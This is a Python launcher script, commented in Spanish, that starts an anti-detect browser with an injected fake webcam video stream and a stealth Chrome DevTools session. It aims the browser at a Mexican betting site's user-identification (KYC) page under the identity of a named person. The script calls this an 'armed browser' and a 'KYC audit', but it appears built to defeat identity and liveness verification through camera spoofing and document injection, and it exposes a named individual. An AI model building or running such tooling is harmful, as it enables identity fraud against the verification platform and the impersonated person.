"""
launch_live_verification.py — Lanzador de Navegador Armado con Monitoreo CDP en Vivo
Sujeto: KAREN GERALDINE DE LA CRUZ ARANA
"""

import os
import sys
import time
import asyncio
import tempfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(REPO_ROOT))
os.chdir(REPO_ROOT)

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

from src.browser import find_orbita_executable, launch_browser_process, attach_cdp_stealth_session, find_free_port
from src.config import BUFFERS_DIR, IDENTITIES_DIR

Y4M_STREAM = str(BUFFERS_DIR / "karen_stream_ready.y4m")
TARGET_URL = "https://betmexico.mx/user-identification"
IDENTITY_ID = "KAREN_GERALDINE_DE_LA_CRUZ_ARANA"

async def main():
    print("\n" + "="*70)
    print("  🚀 LANZAMIENTO DE NAVEGADOR ARMADO — AUDITORÍA KYC BETMEXICO")
    print(f"  Sujeto: {IDENTITY_ID}")
    print(f"  Stream Inyectado: {Path(Y4M_STREAM).name}")
    print(f"  Destino: {TARGET_URL}")
    print("="*70)

    executable = find_orbita_executable()
    if not executable:
        print("[!] Error: No se encontró ejecutable de Chrome o Orbita.")
        sys.exit(1)

    cdp_port = find_free_port()
    user_dir = os.path.join(tempfile.gettempdir(), f"kcky_cdp_{cdp_port}")
    os.makedirs(user_dir, exist_ok=True)

    print(f"\n[*] Ejecutable: {executable}")
    print(f"[*] Puerto CDP: :{cdp_port}")
    print(f"[*] Perfil Temporal: {user_dir}")
    print(f"[*] Abriendo navegador hacia BetMexico...\n")

    # Iniciar proceso de navegador en about:blank para inyección previa
    proc = launch_browser_process(
        executable_path=executable,
        y4m_path=Y4M_STREAM,
        target_url="about:blank",
        cdp_port=cdp_port,
        user_data_dir=user_dir
    )

    async def log_cb(msg, level="info"):
        print(f"  [{level.upper()}] {msg}", flush=True)

    async def event_cb(ev_type, ev_data):
        print(f"  [TELEMETRIA] {ev_type}: {ev_data}", flush=True)

    try:
        # Conectar CDP stealth, inyección de documentos y sniffer de respuestas
        await attach_cdp_stealth_session(
            cdp_port=cdp_port,
            hardware_persona="logitech_c920",
            identity_id=IDENTITY_ID,
            account_id=f"acc_{IDENTITY_ID[:12]}",
            target_url=TARGET_URL,
            event_callback=event_cb,
            log_callback=log_cb
        )
    except KeyboardInterrupt:
        print("\n[*] Cerrando sesión...")
    finally:
        try:
            proc.terminate()
        except Exception:
            pass

if __name__ == "__main__":
    asyncio.run(main())
